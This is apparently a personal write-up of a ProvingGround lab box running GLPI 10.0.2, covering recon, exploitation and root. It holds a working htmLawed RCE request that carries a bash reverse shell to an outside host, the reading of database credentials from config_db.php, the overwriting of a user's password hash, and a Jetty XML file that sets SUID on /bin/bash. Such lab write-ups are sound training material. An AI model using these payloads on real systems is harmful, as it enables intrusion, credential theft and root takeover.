---
tags: [ProvingGround]
---

GLPI 6/3/2025

---------------------------------

## 1. # Nmap 7.95 scan initiated Tue Jun  3 18:44:41 2025 as: /usr/lib/nmap/nmap -p- -sC -sV -Pn -n --open -oN nmap/initial 192.168.116.242
Nmap scan report for 192.168.116.242
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Tried default creds found online. No luck
## 3. gobuster dir -u http://192.168.116.242 -w /usr/share/seclists/Discovery/Web-Content/common.txt
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/LICENSE              (Status: 200) [Size: 35148]
/ajax                 (Status: 301) [Size: 317] [--> http://192.168.116.242/ajax/]
/bin                  (Status: 301) [Size: 316] [--> http://192.168.116.242/bin/]
/config               (Status: 301) [Size: 319] [--> http://192.168.116.242/config/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.116.242/css/]
/files                (Status: 301) [Size: 318] [--> http://192.168.116.242/files/]
/front                (Status: 301) [Size: 318] [--> http://192.168.116.242/front/]
/inc                  (Status: 301) [Size: 316] [--> http://192.168.116.242/inc/]
/index.php            (Status: 200) [Size: 9017]
/install              (Status: 301) [Size: 320] [--> http://192.168.116.242/install/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.116.242/js/]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.116.242/lib/]
/marketplace          (Status: 301) [Size: 324] [--> http://192.168.116.242/marketplace/]
/phpinfo.php          (Status: 200) [Size: 79457]
/pics                 (Status: 301) [Size: 317] [--> http://192.168.116.242/pics/]
/plugins              (Status: 301) [Size: 320] [--> http://192.168.116.242/plugins/]
/public               (Status: 301) [Size: 319] [--> http://192.168.116.242/public/]
/server-status        (Status: 403) [Size: 280]
/sound                (Status: 301) [Size: 318] [--> http://192.168.116.242/sound/]
/src                  (Status: 301) [Size: 316] [--> http://192.168.116.242/src/]
/templates            (Status: 301) [Size: 322] [--> http://192.168.116.242/templates/]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.116.242/vendor/]

## 4. Found usernames is /files/logs betty, glpi
## 5. Found version of GLPI 10.0.2
## 6. Found SQL statment info in /files/logs/sqllogs
## 7. Tried a hydra attack using betty username and rockyou file. No luck.
## 8. Found a vulnerability in 10.0.2 http://192.168.193.242/vendor/htmlawed/htmlawed/htmLawedTest.php. Treid multiple times exploit with no luck.
- Found a couple of write ups about the challenge, it appears the php exec is turned as can view by looking at the phpinfo.php file.
- The way around it is to use the callback functions like array_map,call_user_func.
- I got the following to work:

POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
Host: 192.168.193.242
Content-Length: 153
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.193.242
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.193.242/vendor/htmlawed/htmlawed/htmLawedTest.php
Accept-Encoding: gzip, deflate, br
Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=1lf843gqud298mnao1o231nb7j; sid=0bdni48pebn4nlm7gjknbdtco9
Connection: keep-alive

text=call_user_func&hhook=array_map&hexec=system&sid=0bdni48pebn4nlm7gjknbdtco9&spec[0]=&spec[1]=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.226/80+0>%261'

## 9. www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ netstat -antup
netstat -antup
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0    140 192.168.193.242:56318   192.168.45.226:80       ESTABLISHED 8504/bash
tcp        1      0 192.168.193.242:80      192.168.45.226:39362    CLOSE_WAIT  -
udp        0      0 127.0.0.53:53           0.0.0.0:*  9.

## 10. mysql is running internally.
## 11. www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ cat /var/www/glpi/config/config_db.php
<ed/htmlawed$ cat /var/www/glpi/config/config_db.php
<?php
class DB extends DBmysql {
public $dbhost = 'localhost';
public $dbuser = 'glpi';
public $dbpassword = 'glpi_db_password';
public $dbdefault = 'glpi';
public $use_utf8mb4 = true;
public $allow_myisam = false;
public $allow_datetime = false;
public $allow_signed_keys = false;
}
www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$
## 12. Login into mysql.
## 13. Use Bcrypt to generate new password hash. https://bcrypt.online/
## 14. mysql> update glpi_users set password='$2y$10$GxloDk4BcfJYWomHGEguzOzv111t6beU6z6EoA4Jkin5dPITq5frC' where id=7;
update glpi_users set password='$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu' where id=7;
## 15. Login as betty and password
## 16. Found ticket with reset password SnowboardSkateboardRoller234.
## 17. SSH in as Betty
## 18. See that Jetty application is running.
## 19. Vulnerability RCE https://twitter.com/ptswarm/status/1555184661751648256?lang=en
- echo "chmod +s /bin/bash" > tmp/root.sh
- chmod +x /tmp/root.sh
- nano /opt/jetty/jetty_base/webapps/
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
<Call class="java.lang.Runtime" name="getRuntime">
<Call name="exec">
<Arg>
<Array type="String">
<Item>/tmp/root.sh</Item>
</Array>
</Arg>
</Call>
</Call>
</Configure>
- bash -p